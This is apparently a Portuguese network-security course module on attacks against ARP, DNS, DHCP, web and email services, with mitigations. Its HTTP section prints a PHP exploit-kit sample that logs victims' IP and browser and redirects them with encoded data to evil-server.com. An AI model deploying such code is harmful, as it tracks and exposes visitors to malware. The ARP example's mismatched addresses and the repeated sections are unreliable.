4.0.1 Por que devo fazer este módulo?

⚠️ ATENÇÃO As bases da rede devem ser protegidas, mas isso não é suficiente para proteger completamente a sua rede.

Os protocolos que são usados para conduzir os negócios do dia-a-dia da organização também devem ser protegidos. Além disso, protocolos e software que fornecem serviços através da rede também podem ser alvo de agentes de ameaças. 4.1.1 Vulnerabilidades ARP

Os hosts transmitem uma solicitação ARP para outros hosts no segmento de rede para determinar o endereço MAC de um host com um endereço IP específico. Todos os hosts na sub-rede recebem e processam a solicitação ARP. O host com o endereço IP correspondente na solicitação ARP envia uma resposta ARP.

🔍 PROCESSO ARP
PC-A
192.168.1.5
MAC: AA:AA:AA:AA:AA:AA
H2
192.168.1.6
MAC: A1:A1:A1:A1:A1:A1
H3
192.168.1.8
MAC: BB:BB:BB:BB:BB:BB
ATACANTE
192.168.1.7
MAC: EE:EE:EE:EE:EE:EE
Dispositivo Endereço IP Endereço MAC Cache ARP
PC-A 192.168.1.5 AA:AA:AA:AA:AA:AA ???
Gateway (R1) 192.168.1.254 ??:??:??:??:??:?? -
Solicitação ARP: MAC of 192.168.1.254
ARP Gratuito

Qualquer cliente pode enviar uma resposta ARP não solicitada denominada "ARP gratuito". Isso geralmente é feito quando um dispositivo é inicializado para informar todos os outros dispositivos na rede local o endereço MAC do novo dispositivo.

⚠️ Vulnerabilidade

Qualquer host pode reivindicar ser o proprietário de qualquer IP/MAC que escolher. Um ator de ameaça pode envenenar o cache ARP de dispositivos na rede local, criando um ataque MITM para redirecionar o tráfego.

4.1.2 Envenenamento de cache ARP

O envenenamento do cache ARP pode ser usado para iniciar vários ataques do tipo man-in-the-middle (MITM).

PC-A requer o endereço MAC do seu gateway padrão (R1); então, ele envia uma solicitação ARP para o endereço MAC 192.168.10.1.

Solicitação ARP: Qual o MAC de 192.168.10.1?

O gateway responde com seu MAC legítimo. Mas um atacante pode responder também...

R1 responde: 192.168.10.1 está em EE:EE:EE:EE:EE:EE
Atacante responde: 192.168.10.1 está em AA:AA:AA:AA:AA:AA

O atacante envia ARPs gratuitos falsos dizendo "Sou o gateway" sem ninguém perguntar.

Broadcast: "192.168.10.1 está em AA:AA:AA:AA:AA:AA"
Todos os hosts atualizam suas tabelas ARP com a informação falsa.
🛠️ Ferramentas para ataques ARP MITM
dsniff Cain & Abel ettercap Yersinia

Existem muitas ferramentas disponíveis na Internet para criar ataques ARP MITM.

🎯 Objetivo do Ataque

Associar o endereço MAC do ator de ameaça ao endereço IP do gateway padrão nos caches ARP dos hosts no segmento LAN. Isso posiciona o agente de ameaça entre a vítima e todos os outros sistemas fora da sub-rede local.

4.1.3 Ataques DNS

O protocolo DNS (Domain Name Service) define um serviço automatizado que corresponde a nomes de recursos, como www.cisco.com, com o endereço de rede numérico necessário (IPv4 ou IPv6). Ele inclui o formato para consultas, respostas e dados, e usa os registros de recursos (RR) para identificar o tipo de resposta DNS.

A proteção do DNS geralmente é ignorada. No entanto, é crucial para a operação de uma rede e deve ser protegido adequadamente.
Principais tipos de ataques DNS:
🔓 Ataques de resolver aberto de DNS

Muitas organizações usam serviços de servidores DNS abertos ao público, como o GoogleDNS (8.8.8.8). Esse tipo de servidor DNS responde a consultas de clientes fora de seu domínio administrativo e é vulnerável a diversas atividades maliciosas.

👤 Ataques furtivos de DNS

Para ocultar sua identidade, os agentes de ameaças usam técnicas furtivas como Fast Flux, Double IP Flux e algoritmos de geração de domínio (DGA).

🌑 Ataques de sombreamento de domínio DNS

O agente de ameaças coleta credenciais de conta de domínio para criar silenciosamente vários subdomínios usados durante ataques, sem alertar o proprietário real do domínio pai.

🕳️ Ataques de tunelamento de DNS

Encapsulamento de tráfego não-DNS (como SSH ou HTTP) dentro de consultas e respostas DNS para bypass de firewalls e exfiltração de dados.

4.1.4 Ataques de resolver aberto de DNS

Um resolver aberto de DNS responde a consultas de clientes fora de seu domínio administrativo. Estes são vulneráveis a várias atividades maliciosas:

Os agentes de ameaças enviam informações de recurso de registro falsificado (RR) a um resolvedor de DNS para redirecionar usuários de sites legítimos para sites maliciosos.

Como funciona: O atacante injeta um registro falso no cache do resolvedor, fazendo com que www.banco.com aponte para o IP do atacante.
Legítimo: www.banco.com → 192.168.1.100
Falsificado: www.banco.com → 192.168.1.200 (Atacante)

Os agentes de ameaças usam ataques DoS ou DDoS em resolvedores abertos do DNS para aumentar o volume de ataques e ocultar a verdadeira fonte de um ataque.

Processo:

  1. Atacante forja o IP da vítima em consultas DNS
  2. Envia consultas para resolvedores abertos
  3. Resolvedores respondem para a vítima com respostas grandes (amplificação)
📈
Fator de amplificação
~50x

Exemplo: Consulta de 60 bytes pode gerar resposta de 3000+ bytes

Um ataque de DoS que consome todos os recursos disponíveis para afetar negativamente as operações do resolvedor aberto do DNS.

Impacto: O resolvedor fica sobrecarregado, exigindo reinicialização ou interrupção dos serviços.

Recursos 100% consumidos

4.1.5 Ataques furtivos de DNS

Para ocultar sua identidade, os agentes de ameaças usam técnicas furtivas de DNS para realizar seus ataques.

⚡ Fluxo Rápido (Fast Flux)

Técnica onde o atacante altera rapidamente os registros DNS, alternando entre centenas ou milhares de IPs comprometidos para esconder o servidor real.

domínio.com → IP1
domínio.com → IP2
domínio.com → IP3
🔄 Fluxo de IP duplo (Double IP Flux)

Variação do Fast Flux que também altera os servidores DNS autoritativos, criando uma rede mais resiliente e difícil de rastrear.

NS1 → IP_A NS2 → IP_B
🔢 Algoritmos de geração de domínio (DGA)

Malwares geram dinamicamente centenas de domínios aleatórios diariamente para comunicação com C&C, dificultando bloqueios.

a1b2c3.ru x9y8z7.net m4n5o6.org
Algoritmos de Geração de Domínio (DGA): Usados por botnets para esconder servidores de comando e controle. O malware e o operador usam o mesmo seed para gerar os mesmos domínios.

4.1.6 Ataques de sombreamento de domínio DNS

O sombreamento de domínio envolve o agente de ameaças coletando credenciais de conta de domínio para criar silenciosamente vários subdomínios a serem usados durante os ataques.

Atacante obtém credenciais de conta de domínio (phishing, vazamento, etc.)
Cria subdomínios como "malicioso.dominio.com"
Subdomínios apontam para servidores maliciosos
dominio.com
↓
mal.sub.dominio.com
↓
Servidor do Atacante

Esses subdomínios normalmente apontam para servidores mal-intencionados sem alertar o proprietário real do domínio pai.

4.1.7 Ataques de tunelamento de DNS

O tunelamento DNS encapsula tráfego não-DNS (como SSH, HTTP ou comando & controle) dentro de consultas e respostas DNS, permitindo que atacantes burlem firewalls e exfiltrem dados.

📤 Exfiltração de dados

Dados sensíveis são codificados em consultas DNS:

dado1234.evil.com

O servidor DNS do atacante decodifica e coleta os dados.

🎮 Comando e Controle (C2)

Botnets usam DNS para receber comandos:

comando.update.evil.com

Difícil de bloquear pois DNS é geralmente permitido.

🔒 Firewall permite DNS → Atacante explora

4.1.5 Ataques furtivos de DNS

Para ocultar sua identidade, os agentes de ameaças usam técnicas furtivas de DNS para realizar seus ataques. Clique em cada cabeçalho para ver as definições:

Os atores de ameaças usam essa técnica para ocultar seus sites de entrega de phishing e malware atrás de uma rede que muda rapidamente de hosts DNS comprometidos.

Característica: Os endereços IP do DNS são alterados continuamente em minutos.

As redes de bots geralmente empregam técnicas do Fast Flux para impedir a detecção eficaz de servidores mal-intencionados.

domínio.com → IP1 (minuto 1)
domínio.com → IP2 (minuto 2)
domínio.com → IP3 (minuto 3)

Os atores de ameaças usam essa técnica para alterar rapidamente o nome do host para os mapeamentos de endereço IP e também para alterar o servidor de nomes autoritativo.

Dupla camada: Altera tanto os endereços IP quanto os servidores DNS autoritativos.

Isso aumenta a dificuldade de identificar a fonte do ataque, criando uma rede mais resiliente e difícil de rastrear.

Os atores de ameaças usam essa técnica em malware para gerar aleatoriamente nomes de domínio que podem ser usados como pontos de encontro para seus servidores de comando e controle (C&C).

Exemplo de geração diária:

a1b2c3.ru
x9y8z7.net
m4n5o6.org

O malware e o operador usam o mesmo seed para gerar os mesmos domínios, dificultando bloqueios estáticos.

Sombreamento de domínio DNS

O sombreamento de domínio envolve o agente de ameaças coletando credenciais de conta de domínio para criar silenciosamente vários subdomínios a serem usados durante os ataques. Esses subdomínios normalmente apontam para servidores mal-intencionados sem alertar o proprietário real do domínio pai.

4.1.6 Tunelamento DNS

Botnets se tornaram um método de ataque popular de atores ameaçadores. Na maioria das vezes, os botnets são usados para espalhar malware ou iniciar ataques de DDoS e phishing.

Atenção: O DNS na empresa às vezes é negligenciado como um protocolo que pode ser usado por botnets. Quando o tráfego DNS é determinado como parte de um incidente, o ataque geralmente já acabou.

Registros DNS explorados:

4.1.7 DHCP: Operação Normal

Os servidores DHCP fornecem dinamicamente informações de configuração de IP aos clientes. A figura mostra a sequência típica de uma troca de mensagens DHCP entre cliente e servidor.

Processo DORA (Discover, Offer, Request, Acknowledge)
Cliente DHCP
"Gostaria de solicitar um endereço."
DHCPDISCOVER (Broadcast)
Servidor DHCP
"Sou DHCPsvr1. Este é um endereço que posso oferecer".
DHCPOFFER (Unicast)
IP: 192.168.10.15
Mask: 255.255.255.0
Gateway: 192.168.10.1
Lease: 3 days
Cliente DHCP
"Aceito a oferta do endereço IP".
DHCPREQUEST (Broadcast)
Servidor DHCP
"Sua aceitação é reconhecida".
DHCPACK (Unicast)

Na figura, um cliente transmite uma mensagem de descoberta DHCP (broadcast). O servidor DHCP responde com uma oferta direta (unicast) que inclui informações de endereçamento. O cliente transmite em difusão (broadcast) uma solicitação DHCP para informar ao servidor que aceita a oferta. O servidor responde com uma confirmação direta (unicast) aceitando a solicitação.

4.1.8 Ataques DHCP (Spoofing)

Um ataque de spoofing de DHCP ocorre quando um servidor DHCP invasor está conectado à rede e fornece falsos parâmetros de configuração IP aos clientes legítimos.

⚠️ Informações enganosas fornecidas:
  • Gateway padrão errado - Atacante fornece gateway inválido ou seu próprio IP para ataque MITM
  • Servidor DNS errado - Aponta usuário para sites maliciosos
  • Endereço IP errado - Cria ataque de negação de serviço (DoS)
📋 Etapas do ataque de falsificação DHCP:

Um cliente legítimo se conecta à rede e requer parâmetros de configuração de IP. O cliente transmite uma solicitação de descoberta de DHCP procurando uma resposta de um servidor DHCP. Ambos os servidores (legítimo e atacante) recebem a mensagem.

DHCP Discover (Broadcast)

Os servidores DHCP legítimos e o não autorizado respondem com parâmetros de configuração de IP válidos. O cliente responde à primeira oferta recebida.

Servidor Legítimo
DHCP Offer
Servidor Não Autorizado
DHCP Offer

Nesse cenário, o cliente recebeu a oferta não autorizada primeiro. Ele transmite uma solicitação DHCP, aceitando os parâmetros do servidor não autorizado. Cada servidor (legítimo e não autorizado) recebe a solicitação.

DHCP Request (Broadcast)
Cliente aceita oferta do atacante

Apenas o servidor não autorizado envia uma resposta ao cliente para confirmar sua solicitação (DHCP ACK). O servidor legítimo para de se comunicar com o cliente porque a solicitação já foi confirmada.

4.2.1 HTTP e HTTPS

Os navegadores da Internet são usados por quase todos. Bloquear completamente a navegação na Web não é uma opção porque as empresas precisam de acesso à Web, sem comprometer a segurança.

Missão do analista de segurança: Para investigar ataques baseados na Web, os analistas devem ter uma boa compreensão de como funciona um ataque padrão baseado na Web.
🎯 Estágios de um ataque típico da web:
1 Vítima acessa página comprometida

A vítima visita inconscientemente uma página web que foi comprometida por malware.

2 Redirecionamento

A página comprometida redireciona o usuário através de vários servidores comprometidos para um site com código malicioso.

3 Drive-by Download

Um kit de exploração (geralmente PHP) verifica software vulnerável no computador da vítima (OS, Java, Flash).

4 Download do exploit

Kit de exploração baixa código que usa a vulnerabilidade para executar código malicioso.

5 Conexão ao servidor de malware

Computador comprometido baixa carga útil (malware ou downloader).

6 Execução do malware

O último pacote de malware é executado no computador da vítima.

CASO DE USO: Kit de Exploração em PHP (Fins Educacionais)

Cenário: Um site legítimo foi comprometido e os atacantes injetaram um script PHP que funciona como um "exploit kit". Quando um usuário acessa a página, o script verifica o navegador e tenta explorar vulnerabilidades conhecidas. 

<?php
// KIT DE EXPLORAÇÃO SIMPLES (APENAS PARA ESTUDO)
// Este código demonstra como atacantes identificam vítimas

// Coleta informações do navegador da vítima
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$ip = $_SERVER['REMOTE_ADDR'];
$referer = $_SERVER['HTTP_REFERER'] ?? 'Direto';

// Detecta software vulnerável via User-Agent
$vulnerabilities = [];

if (preg_match('/MSIE [5-8]/i', $user_agent)) {
    $vulnerabilities[] = 'Internet Explorer (MS15-018)';
}

if (preg_match('/Java\/1\.[6-7]/i', $user_agent)) {
    $vulnerabilities[] = 'Java SE 6/7 (CVE-2013-2465)';
}

if (preg_match('/Flash [0-9]{1,2}\.[0-9]/i', $user_agent)) {
    $vulnerabilities[] = 'Flash Player (CVE-2018-4878)';
}

// Registra a vítima em um log (para o atacante)
$log_entry = date('Y-m-d H:i:s') . " | IP: $ip | UA: $user_agent | Ref: $referer\n";
file_put_contents('victims.log', $log_entry, FILE_APPEND);

// Se encontrou vulnerabilidades, redireciona para o servidor de exploit
if (!empty($vulnerabilities)) {
    // Codifica as informações para o servidor C2
    $data = base64_encode(json_encode([
        'ip' => $ip,
        'vulns' => $vulnerabilities
    ]));

    // Redireciona para o servidor de malware (ofuscação)
    header('Location: http://evil-server.com/exploit?data=' . $data);
    exit;
} else {
    // Se não detectou vulnerabilidades, exibe página normal (fingindo ser legítimo)
    echo '<html><body><h1>Bem-vindo!</h1></body></html>';
}
?>
⚠️ APENAS PARA ESTUDO PHP Exploit Kit Simulado

O código acima é uma representação educacional de como um kit de exploração em PHP coleta informações da vítima e redireciona para servidores maliciosos. Em ataques reais, os códigos são ofuscados e utilizam múltiplas camadas de redirecionamento.

4.2.2 Exploits HTTP Comuns

Os ataques baseados na Web exploram funcionalidades legítimas do protocolo HTTP para comprometer sistemas. Conheça os principais exploits utilizados por atores de ameaça e como se proteger.

IFRAME

IFrames Maliciosos

Os atores de ameaças costumam usar quadros inline maliciosos (iFrames). Um iFrame é um elemento HTML que permite que o navegador carregue outra página da Web a partir de outra fonte. Os ataques de iFrame tornaram-se muito comuns, pois são frequentemente usados para inserir anúncios de outras fontes na página.

Os atores de ameaças comprometem um servidor da Web e modificam páginas da Web adicionando HTML para o iFrame malicioso. O HTML vincula ao servidor da web do ator da ameaça. Em alguns casos, a página iFrame carregada consiste em apenas alguns pixels. Isso torna muito difícil para o usuário ver. Como o iFrame é executado na página, ele pode ser usado para fornecer uma exploração mal-intencionada, como publicidade de spam, um kit de exploração e outros malwares.

CONTRAMEDIDAS
  • Use um proxy da Web para bloquear sites mal-intencionados.
  • Verifique se os desenvolvedores da Web não usam iFrames para isolar conteúdo de terceiros.
  • Use um serviço como o Cisco Umbrella para bloquear sites maliciosos conhecidos.
  • Eduque os usuários finais sobre o que é um iFrame e como ele é usado em ataques.
HTTP 302

Amortecimento HTTP 302

Outro tipo de ataque HTTP é o ataque de amortecimento HTTP 302. Os atores de ameaças usam o código de status de resposta 302 Found HTTP para direcionar o navegador da Web do usuário para um novo local. Os atores de ameaças costumam usar funções HTTP legítimas, como redirecionamentos HTTP para realizar seus ataques.

HTTP permite que os servidores redirecionem a solicitação HTTP de um cliente para um servidor diferente. O redirecionamento HTTP é usado, por exemplo, quando o conteúdo da Web é movido para um URL ou nome de domínio diferente. Isso permite que URLs e marcadores antigos continuem a funcionar. Portanto, os analistas de segurança devem entender como uma função como o redirecionamento HTTP funciona e como ela pode ser usada durante ataques.

Quando a resposta do servidor é um status 302 Encontrado, ele também fornece a URL no campo de localização. O navegador acredita que o novo local é o URL fornecido no cabeçalho. O navegador é convidado a solicitar este novo URL. Esta função de redirecionamento pode ser usada várias vezes até que o navegador finalmente puxe na página que contém o exploit. Os redirecionamentos podem ser difíceis de detectar devido ao fato de que redirecionamentos legítimos ocorrem frequentemente na rede.

PREVENÇÃO
  • Use um proxy da Web para bloquear sites mal-intencionados.
  • Use um serviço como o Cisco Umbrella para impedir que os usuários naveguem para sites maliciosos.
  • Eduque os usuários finais sobre como os redirecionamentos HTTP 302 funcionam.
DOMAIN SHADOWING

Sombreamento de Domínio

Quando um ator de ameaça deseja criar um ataque de sombreamento de domínio, o ator de ameaça deve primeiro comprometer um domínio. Em seguida, o ator de ameaça deve criar vários subdomínios desse domínio para ser usado para os ataques. Logins de registro de domínio seqüestrados são usados para criar os muitos subdomínios necessários.

Depois que esses subdomínios tiverem sido criados, os invasores podem usá-los como quiserem, mesmo que sejam encontrados domínios mal-intencionados. Eles podem simplesmente fazer mais do domínio pai.

Sequência Típica do Ataque:

  1. Um site fica comprometido.
  2. O amortecimento HTTP 302 é usado para enviar o navegador para sites maliciosos.
  3. O sombreamento de domínio é usado para direcionar o navegador para um servidor comprometido.
  4. Uma página inicial do kit de exploração é acessada.
  5. Downloads de malware da página inicial do kit de exploração.
MITIGAÇÃO
  • Proteja todas as contas de proprietário do domínio com senhas fortes e autenticação de dois fatores.
  • Use um proxy da Web para bloquear sites mal-intencionados.
  • Use um serviço como o Cisco Umbrella para bloquear domínios maliciosos conhecidos.
  • Proprietários de domínio devem validar contas de registro e procurar subdomínios não autorizados.

4.2.3 Ameaças por E-mail

Nos últimos 25 anos, o email evoluiu de uma ferramenta usada principalmente por profissionais técnicos e de pesquisa para se tornar a espinha dorsal das comunicações corporativas. A cada dia, mais de 100 bilhões de mensagens de e-mail corporativo são trocadas. À medida que o nível de uso aumenta, a segurança torna-se uma prioridade maior.

A maneira como os usuários acessam o email hoje também aumenta a oportunidade de a ameaça de malware ser introduzida. Costumava ser que os usuários corporativos acessavam e-mails baseados em texto a partir de um servidor corporativo. O servidor corporativo estava em uma estação de trabalho protegida pelo firewall da empresa. Hoje, as mensagens HTML são acessadas a partir de muitos dispositivos diferentes que muitas vezes não são protegidos pelo firewall da empresa. HTML permite mais ataques devido à quantidade de acesso que às vezes pode ignorar diferentes camadas de segurança.

Principais Ameaças por E-mail:

ANEXOS

Ataques baseados em anexos maliciosos que executam código ao serem abertos.

SPOOFING

Falsificação de remetente para enganar o destinatário.

SPAM

Mensagens não solicitadas em massa que sobrecarregam sistemas.

OPEN RELAY

Servidores mal configurados que permitem envio anônimo de e-mails.

HOMOGLIFOS

Caracteres visualmente idênticos usados para criar domínios falsos (ex: g00gle.com).

ESTRATÉGIA DE DEFESA

Assim como qualquer outro serviço que esteja escutando uma porta para conexões de entrada, os servidores SMTP também podem ter vulnerabilidades. Mantenha sempre o software SMTP atualizado com patches e atualizações de segurança.

Contramedidas Técnicas:
  • Use um Security Appliance específico para e-mail, como o Cisco Email Security Appliance.
  • Implemente soluções para detectar e bloquear phishing, spam e malware.
A Última Linha de Defesa:

Eduque o usuário final. Quando os ataques passam pelas medidas de segurança em vigor — e eles vão passar, às vezes — o usuário final é a última linha de defesa. Ensine-os a reconhecer spam, tentativas de phishing, links e URLs suspeitos, homoglifos e a nunca abrir anexos suspeitos.

4.2.3 Ameaças por E-mail

Nos últimos 25 anos, o email evoluiu de uma ferramenta usada principalmente por profissionais técnicos e de pesquisa para se tornar a espinha dorsal das comunicações corporativas. A cada dia, mais de 100 bilhões de mensagens de e-mail corporativo são trocadas. À medida que o nível de uso aumenta, a segurança torna-se uma prioridade maior.

A maneira como os usuários acessam o email hoje também aumenta a oportunidade de a ameaça de malware ser introduzida. Costumava ser que os usuários corporativos acessavam e-mails baseados em texto a partir de um servidor corporativo. O servidor corporativo estava em uma estação de trabalho protegida pelo firewall da empresa. Hoje, as mensagens HTML são acessadas a partir de muitos dispositivos diferentes que muitas vezes não são protegidos pelo firewall da empresa. HTML permite mais ataques devido à quantidade de acesso que às vezes pode ignorar diferentes camadas de segurança.

Principais Ameaças por E-mail:

Os agentes de ameaças enviam e-mails não solicitados contendo anúncios ou ficheiros maliciosos. Esse tipo de e-mail é enviado com mais frequência para solicitar uma resposta, informando ao ator da ameaça que o e-mail é válido e que um usuário abriu o spam.

Contramedida: Nunca abra anexos suspeitos e utilize soluções de segurança de e-mail.

Os atores de ameaças criam mensagens de e-mail com um endereço de remetente falsificado que visa enganar o destinatário a fornecer dinheiro ou informações confidenciais.

Por exemplo, um banco envia um e-mail solicitando que você atualize suas credenciais. Quando este e-mail exibe o logotipo do banco idêntico ao e-mail que você abriu anteriormente e que era legítimo, ele tem uma maior chance de ser aberto, ter anexos abertos e links clicados. O e-mail falsificado pode até pedir que você verifique suas credenciais para que o banco tenha certeza de que você é você, expondo suas informações de login.

Defesa: Verifique sempre o endereço de e-mail do remetente e desconfie de solicitações urgentes de informações pessoais.

Os agentes de ameaças enviam e-mails não solicitados contendo anúncios ou ficheiros maliciosos. Esse tipo de e-mail é enviado com mais frequência para solicitar uma resposta, informando ao ator da ameaça que o e-mail é válido e que um usuário abriu o spam.

O spam não é apenas irritante, mas também pode ser um vetor para ataques mais sofisticados, servindo como primeira etapa para validar endereços de e-mail ativos.

Mitigação: Utilize filtros anti-spam e nunca responda a e-mails não solicitados.

Os atores de ameaças aproveitam os servidores corporativos configurados incorretamente como retransmissores de email abertos para enviar grandes volumes de spam ou malware para usuários desavisados.

O retransmissor de email aberto é um servidor SMTP que permite que qualquer pessoa na internet envie e-mails. Como qualquer pessoa pode usar o servidor, eles são vulneráveis a spammers e worms. Volumes muito grandes de spam podem ser enviados usando um retransmissor de email aberto.

Prevenção: É importante que os servidores de e-mail corporativos nunca sejam configurados como uma retransmissão aberta. Isso reduzirá consideravelmente a quantidade de e-mails não solicitados.

Os atores de ameaças podem usar caracteres de texto muito semelhantes ou até mesmo idênticos aos caracteres de texto legítimos. Por exemplo, pode ser difícil distinguir entre um O (letra maiúscula O) e um 0 (número zero) ou um I (minúsculo "L") e um 1 (número um).

Eles podem ser usados em e-mails de phishing para torná-los muito convincentes. No DNS, esses caracteres são muito diferentes do real. Quando o registro DNS é pesquisado, um URL completamente diferente é encontrado quando o link com o homoglifo é usado na pesquisa.

Defesa: Ensine os usuários a verificar URLs cuidadosamente e a digitar endereços manualmente quando tiverem dúvidas.
VULNERABILIDADES SMTP

Assim como qualquer outro serviço que esteja escutando uma porta para conexões de entrada, os servidores SMTP também podem ter vulnerabilidades. Mantenha sempre o software SMTP atualizado com patches e atualizações de segurança.

Contramedidas Técnicas:
  • Use um Security Appliance específico para e-mail, como o Cisco Email Security Appliance.
  • Implemente soluções para detectar e bloquear phishing, spam e malware.

4.3.1 Defender a Rede

Vigilância constante e educação contínua são necessários para defender sua rede contra ataques. Veja a seguir as melhores práticas para proteger uma rede:

Política de Segurança

Desenvolva uma política de segurança escrita para a empresa.

Educação

Eduque os funcionários sobre riscos de engenharia social e validação de identidades.

Acesso Físico

Controle o acesso físico aos sistemas.

Senhas Fortes

Use senhas fortes e altere-as com frequência.

Criptografia

Criptografe e proteja por senha dados sensíveis.

Hardware/Software

Implemente firewalls, IPSs, VPNs, antivírus e filtragem de conteúdo.

Backups

Realize backups e teste os arquivos regularmente.

Serviços Desnecessários

Desligue serviços e portas não utilizados.

Patches

Mantenha as correções atualizadas semanal ou diariamente.

Auditorias

Execute auditorias de segurança para testar a rede.

4.3.2 Mitigando Malware

Malware, incluindo vírus, worms e cavalos de Tróia, pode causar sérios problemas em redes e dispositivos finais. Os administradores de rede têm vários meios de mitigar esses ataques.

NOTA: As técnicas de mitigação são frequentemente referidas na comunidade de segurança como "contramedidas".

Software Antivírus

Uma maneira de mitigar ataques de vírus e cavalos de Tróia é o software antivírus. O software antivírus ajuda a impedir que os hosts sejam infectados e espalhem código malicioso. Isso requer muito mais tempo para limpar computadores infectados do que para manter atualizações de software antivírus e definições de antivírus nas mesmas máquinas.

O software antivírus é o produto de segurança mais amplamente implantado no mercado hoje. Várias empresas que criam software antivírus, como Symantec, McAfee e Trend Micro, estão no negócio de detectar e eliminar vírus há mais de uma década. Muitas corporações e instituições educacionais compram licenciamento por volume para seus usuários. Os usuários são capazes de fazer login em um site com sua conta e baixar o software antivírus em seus desktops, laptops ou servidores.

Os produtos antivírus têm opções de automação de atualização para que novas definições de vírus e novas atualizações de software possam ser baixadas automaticamente ou sob demanda. Esta prática é o requisito mais crítico para manter uma rede livre de vírus e deve ser formalizada em uma política de segurança de rede.

Limitações

Os produtos antivírus são baseados em host. Esses produtos são instalados em computadores e servidores para detectar e eliminar vírus. No entanto, eles não impedem que vírus entrem na rede, portanto, um profissional de segurança de rede deve estar ciente dos principais vírus e acompanhar as atualizações de segurança em relação a vírus emergentes.

Defesa no Perímetro

Outra maneira de mitigar ameaças de malware é evitar que arquivos de malware entrem na rede. Dispositivos de segurança no perímetro da rede podem identificar arquivos de malware conhecidos com base em seus indicadores de compromisso. Os arquivos podem ser removidos do fluxo de dados de entrada antes que eles possam causar um incidente.

Infelizmente, os atores da ameaça estão cientes dessa contramedida e frequentemente alteram seu malware o suficiente para evitar a detecção. Essas façanhas entrarão na rede e também evitarão software antivírus. Nenhuma técnica de mitigação pode ser 100% eficaz. Incidentes de segurança vão acontecer.

4.3.3 Mitigando Worms

Worms são mais baseados em rede do que vírus. A mitigação de worm requer diligência e coordenação por parte dos profissionais de segurança de rede.

Como mostrado na figura, a resposta a um ataque de vermes pode ser dividida em quatro fases: contenção, inoculação, quarentena e tratamento.

A fase de contenção envolve limitar a propagação de uma infecção por vermes para áreas da rede que já estão afetadas. Isso requer compartimentação e segmentação da rede para abrandar ou parar o worm e evitar que hosts atualmente infectados segmentem e infectem outros sistemas.

Implementação:

A contenção requer o uso de ACLs de saída e entrada em roteadores e firewalls em pontos de controle dentro da rede.

A fase de inoculação corre paralela ou subsequente à fase de contenção. Durante a fase de inoculação, todos os sistemas não infectados são corrigidos com o patch de fornecedor apropriado. O processo de inoculação priva ainda mais o worm de quaisquer alvos disponíveis.

A fase de quarentena envolve rastrear e identificar máquinas infectadas dentro das áreas contidas e desconectá-las, bloquear ou removê-las. Isto isola estes sistemas adequadamente para a fase de tratamento.

A fase de tratamento envolve a desinfecção ativa dos sistemas infectados. Isso pode envolver encerrar o processo do worm, remover arquivos modificados ou configurações do sistema introduzidos pelo worm e corrigir a vulnerabilidade que o worm usou para explorar o sistema.

Caso Grave:

Alternativamente, em casos mais graves, o sistema pode precisar ser reinstalado para garantir que o worm e seus subprodutos sejam removidos.

4.3.4 Mitigando Ataques de Reconhecimento

Os ataques de reconhecimento são tipicamente o precursor de outros ataques que têm a intenção de obter acesso não autorizado a uma rede ou interromper a funcionalidade da rede.

Técnicas de mitigação

Um profissional de segurança de rede pode detectar quando um ataque de reconhecimento está em andamento recebendo notificações de alarmes pré-configuradas. Estes alarmes são provocados quando determinados parâmetros são excedidos, tal como o número de pedidos ICMP por segundo.

DETECÇÃO PROATIVA

Uma variedade de tecnologias está disponível para detectar padrões de tráfego anômalos que indicam atividades de reconhecimento, permitindo que a equipe de segurança responda antes que um ataque mais grave ocorra.

4.4 Resumo de Atacando o que Fazemos

4.4.1 O que aprendi neste módulo?

  • ARP: Qualquer host pode enviar uma resposta ARP não solicitada ("ARP gratuito"), permitindo ataques de envenenamento de cache ARP e MiTM.
  • DNS: Vulnerável a envenenamento de cache, amplificação/reflexão (DDoS), ataques de utilização de recursos, Fast Flux, Double IP Flux, domain shadowing e tunelamento DNS.
  • DHCP: Ataques de spoofing ocorrem quando um servidor DHCP invasor fornece configurações falsas aos clientes.

  • Ataques Web: Drive-by downloads, iFrames maliciosos, HTTP 302, domain shadowing. Contramedidas incluem proxies, OWASP e educação.
  • Ataques de E-mail: Anexos maliciosos, spoofing, spam, open relay, homoglifos. Use Cisco Email Security Appliance e eduque usuários.
  • Aplicações Web: Injeção SQL, XSS. Siga as práticas do OWASP Top 10.

  • Práticas Gerais: Política de segurança, educação, controle de acesso físico, senhas fortes, criptografia, backups, desligar serviços desnecessários, patches atualizados, auditorias.
  • Malware: Antivírus, defesa no perímetro, mas nenhuma solução é 100% eficaz.
  • Worms: Fases: Contenção, Inoculação, Quarentena, Tratamento.
  • Reconhecimento: Alarmes baseados em parâmetros (ex: ICMP por segundo).
  • Acesso: Autenticação, criptografia, patches, princípio do menor privilégio.
  • DoS: Monitore utilização da rede, muitos ataques DoS usam endereços falsificados.

Serviços IP

ARP

Address Resolution Protocol

Os hosts transmitem uma solicitação ARP para outros hosts no segmento de rede para determinar o endereço MAC de um host com um endereço IP específico. Qualquer cliente pode enviar uma resposta ARP não solicitada denominada "ARP gratuito". Esse recurso do ARP também significa que qualquer host pode reivindicar ser o proprietário de qualquer IP/MAC que escolher.

Ameaça: Um ator de ameaça pode envenenar o cache ARP de dispositivos na rede local, criando um ataque MiTM para redirecionar o tráfego.
DNS

Domain Name Service

O protocolo DNS define um serviço automatizado que combina nomes de recursos com o endereço de host IP numérico necessário. O DNS é crucial para a operação de uma rede e deve ser protegido de acordo.

Vulnerabilidades:
  • Envenenamento de cache DNS: Registros falsificados são fornecidos ao resolver aberto.
  • Ataques de amplificação e reflexão DNS: Exploram a natureza benigna do DNS para causar ataques DoS/DDoS.
  • Ataques de utilização de recursos DNS: DoS contra o próprio servidor DNS.
Técnicas Furtivas:
  • Fast Flux: Servidores mal-intencionados mudam rapidamente seu endereço IP.
  • Double IP Flux: Mudança rápida do nome de domínio para mapeamento IP e do servidor de nomes autoritativo.
  • Domain Shadowing: Criação silenciosa de múltiplos subdomínios usando credenciais de contas de domínio comprometidas.
  • Tunelamento DNS: Tráfego não-DNS encapsulado em tráfego DNS para contornar soluções de segurança.
Contramedida: Use filtros que inspecionem o tráfego DNS. Fique atento a servidores DNS dinâmicos.
DHCP

Dynamic Host Configuration Protocol

O DHCP usa uma simples troca de mensagens broadcast e unicast para fornecer aos hosts informações de endereçamento.

Ataque de Spoofing: Ocorre quando um servidor DHCP invasor está conectado à rede e fornece falsos parâmetros de configuração IP (gateway incorreto, DNS falso, IP incorreto) aos clientes legítimos.

Serviços Corporativos

Ataques Baseados na Web

